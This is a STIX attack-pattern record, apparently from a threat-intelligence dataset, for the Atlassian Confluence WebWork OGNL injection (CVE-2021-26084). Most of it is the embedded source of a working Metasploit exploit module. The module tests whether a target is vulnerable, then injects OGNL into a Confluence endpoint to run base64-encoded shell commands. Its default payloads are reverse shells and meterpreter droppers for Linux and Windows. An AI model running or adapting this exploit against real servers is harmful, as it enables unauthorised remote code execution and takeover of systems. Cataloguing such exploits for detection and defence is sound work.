{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e0a75b18-325b-48a4-89cf-eceeed1d5ab5",
    "created": "2024-08-14T17:07:27.033789Z",
    "modified": "2024-08-14T17:07:27.033793Z",
    "name": "Atlassian Confluence WebWork OGNL Injection",
    "description": " This module exploits an OGNL injection in Atlassian Confluence's WebWork component to execute commands as the Tomcat user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/atlassian_confluence_webwork_ognl_injection.rb",
            "external_id": "atlassian_confluence_webwork_ognl_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-26084"
        },
        {
            "source_name": "reference",
            "url": "https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html"
        },
        {
            "source_name": "reference",
            "url": "https://jira.atlassian.com/browse/CONFSERVER-67940"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/Eu74wdMbEL/cve-2021-26084-confluence-server-ognl-injection/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md"
        },
        {
            "source_name": "reference",
            "url": "https://testbnull.medium.com/atlassian-confluence-pre-auth-rce-cve-2021-26084-v%C3%A0-c%C3%A2u-chuy%E1%BB%87n-v%E1%BB%81-%C4%91i%E1%BB%83m-m%C3%B9-khi-t%C3%ACm-bug-43ab36b6c455"
        },
        {
            "source_name": "reference",
            "url": "https://tradahacking.vn/atlassian-confluence-cve-2021-26084-the-other-side-of-bug-bounty-45ed19c814f6"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n  include Msf::Module::Deprecated\n\n  # Added Windows support\n  moved_from 'exploit/linux/http/atlassian_confluence_webwork_ognl_injection'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Atlassian Confluence WebWork OGNL Injection',\n        'Description' => %q{\n          This module exploits an OGNL injection in Atlassian Confluence's\n          WebWork component to execute commands as the Tomcat user.\n        },\n        'Author' => [\n          'Benny Jacob', # Discovery\n          'Jang', # Analysis\n          'wvu' # Analysis and exploit\n        ],\n        'References' => [\n          ['CVE', '2021-26084'],\n          ['URL', 'https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html'],\n          ['URL', 'https://jira.atlassian.com/browse/CONFSERVER-67940'],\n          ['URL', 'https://attackerkb.com/topics/Eu74wdMbEL/cve-2021-26084-confluence-server-ognl-injection/rapid7-analysis'],\n          ['URL', 'https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md'],\n          ['URL', 'https://testbnull.medium.com/atlassian-confluence-pre-auth-rce-cve-2021-26084-v%C3%A0-c%C3%A2u-chuy%E1%BB%87n-v%E1%BB%81-%C4%91i%E1%BB%83m-m%C3%B9-khi-t%C3%ACm-bug-43ab36b6c455'],\n          ['URL', 'https://tradahacking.vn/atlassian-confluence-cve-2021-26084-the-other-side-of-bug-bounty-45ed19c814f6']\n        ],\n        'DisclosureDate' => '2021-08-25',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux', 'win'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_perl'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_https'\n              }\n            }\n          ],\n          [\n            'PowerShell Stager',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :psh,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_https'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 8090\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    token1 = rand_text_alphanumeric(8..16)\n    token2 = rand_text_alphanumeric(8..16)\n    token3 = rand_text_alphanumeric(8..16)\n\n    res = inject_ognl(\"#{token1}'+'#{token2}'+'#{token3}\")\n\n    return CheckCode::Unknown unless res\n\n    unless res.code == 200 && res.body.include?(\"#{token1}#{token2}#{token3}\")\n      return CheckCode::Safe('Failed to test OGNL injection.')\n    end\n\n    CheckCode::Vulnerable('Successfully tested OGNL injection.')\n  end\n\n  def exploit\n    print_status(\"Executing #{payload_instance.refname} (#{target.name})\")\n\n    case target['Type']\n    when :cmd\n      execute_command(payload.encoded)\n    when :dropper\n      execute_cmdstager\n    when :psh\n      execute_command(cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true))\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    res = inject_ognl(ognl_payload(cmd))\n\n    unless res&.code == 200 && res.body.match?(/queryString.*Process.*pid.*exitValue/)\n      fail_with(Failure::PayloadFailed, \"Failed to execute command: #{cmd}\")\n    end\n\n    vprint_good(\"Successfully executed command: #{cmd}\")\n  end\n\n  def inject_ognl(ognl)\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/pages/createpage-entervariables.action'),\n      'vars_post' => {\n        # https://commons.apache.org/proper/commons-ognl/apidocs/org/apache/commons/ognl/JavaCharStream.html\n        # https://github.com/jkuhnert/ognl/blob/f4e18cda6a89bcdad15c617c0d94013a854a1e93/src/main/java/ognl/JavaCharStream.java#L324-L341\n        'queryString' => Rex::Text.to_hex(ognl, '\\\\u00')\n      }\n    )\n  end\n\n  def ognl_payload(cmd)\n    # https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#expression-language-el---code-execution\n    # https://www.tutorialspoint.com/java/lang/class_forname_loader.htm\n    # https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html\n    # https://docs.oracle.com/javase/8/docs/api/java/util/Base64.Decoder.html\n    <<~OGNL.gsub(/^\\s+/, '').tr(\"\\n\", '')\n      '+Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval('\n        new java.lang.ProcessBuilder(\n          #{target_shell},\n          new java.lang.String(\n            java.util.Base64.getDecoder().decode(\"#{Rex::Text.encode_base64(cmd)}\")\n          )\n        ).start()\n      ')+'\n    OGNL\n  end\n\n  def target_shell\n    target['Platform'] == 'win' ? '\"cmd.exe\",\"/c\"' : '\"/bin/sh\",\"-c\"'\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-08-25",
    "x_mitre_platforms": [
        "win'"
    ]
}